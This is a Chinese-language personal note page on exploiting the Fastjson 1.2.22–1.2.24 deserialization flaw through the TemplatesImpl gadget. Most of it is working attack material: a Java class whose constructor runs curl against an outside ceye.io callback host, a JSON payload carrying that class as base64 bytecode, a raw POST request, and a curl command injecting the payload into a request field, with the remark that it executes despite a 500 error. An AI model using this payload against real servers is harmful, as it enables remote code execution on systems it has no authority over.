<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>基于：TemplatesImpl</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>基于：TemplatesImpl</h1><br/><br /><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a><br /><br />在1.2.22和1.2.24版本区间起作用<br /><br />基于：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;<br />需要打开SupportNonPublic开关<br /><br />先写一个测试类，编译成class文件<br /><br /><br /><div class="codebox"><div class="codebox">import&nbsp;com.sun.org.apache.xalan.internal.xsltc.DOM;<br />import&nbsp;com.sun.org.apache.xalan.internal.xsltc.TransletException;<br />import&nbsp;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br />import&nbsp;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br />import&nbsp;com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br />import&nbsp;java.io.IOException;<br /><br />public&nbsp;class&nbsp;Main&nbsp;extends&nbsp;AbstractTranslet&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;Main()&nbsp;throws&nbsp;IOException&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Runtime.getRuntime().exec(&quot;curl&nbsp;jx4r89.ceye.io?FastJSON&quot;);//自己ceye上的域名<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;@Override<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;void&nbsp;transform(DOM&nbsp;document,&nbsp;DTMAxisIterator&nbsp;iterator,&nbsp;SerializationHandler&nbsp;handler)&nbsp;{}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;@Override<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;void&nbsp;transform(DOM&nbsp;document,&nbsp;com.sun.org.apache.xml.internal.serializer.SerializationHandler[]&nbsp;handlers)&nbsp;throws&nbsp;TransletException&nbsp;{}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;throws&nbsp;Exception&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Main&nbsp;t&nbsp;=&nbsp;new&nbsp;Main();<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /></div></div><br /><br />javac Test.java 编译后用 .class 文件的 base64 编码（cat Test.calss | base64）构造下面的 PoC<br /><br /><div class="codebox"><div class="codebox"><span style="color:#000000;font-weight:400">{</span>&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAJTWFpbi5qYXZhDAAIAAkHACEMACIAIwEAHGN1cmwgang0cjg5LmNleWUuaW8/RmFzdEpTT04MACQAJQEABE1haW4BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACQAEAAoADQALAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAADgABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFAAIABUADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:{&nbsp;},&quot;_outputProperties&quot;:{&nbsp;},&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;<span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><div class="codebox"><div class="codebox">POST&nbsp;/&nbsp;HTTP/1.1<br />Host:&nbsp;192.168.248.128:8080<br />User-Agent:&nbsp;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;10.0;&nbsp;Win64;&nbsp;x64)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/73.0.3683.47&nbsp;Safari/537.36<br />Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language:&nbsp;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br />Accept-Encoding:&nbsp;gzip,&nbsp;deflate<br />Connection:&nbsp;close<br />Upgrade-Insecure-Requests:&nbsp;1<br />Content-Length:&nbsp;1560<br /><br />poc</div></div><br /><br /><br /><h1>检测</h1>：<br />例如原来的 HTTP 请求为 curl <a href="http://localhost:8080">http://localhost:8080</a> -d &#39;{&quot;age&quot;: 12, &quot;name&quot;: &quot;test&quot;}&#39;。<br />代入 Payload，可得<br /><br /><div class="codebox"><div class="codebox">curl&nbsp;http://localhost:8081&nbsp;-d&nbsp;&#39;{&quot;age&quot;:&nbsp;12,&nbsp;&quot;name&quot;:&nbsp;{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAJTWFpbi5qYXZhDAAIAAkHACEMACIAIwEAHGN1cmwgang0cjg5LmNleWUuaW8/RmFzdEpTT04MACQAJQEABE1haW4BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACQAEAAoADQALAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAADgABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFAAIABUADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:{&nbsp;},&quot;_outputProperties&quot;:{&nbsp;},&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;}}&#39;</div></div><br /><br /><br /><br />此时网页会报 500 错误，但 Payload 已经被执行成功。<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>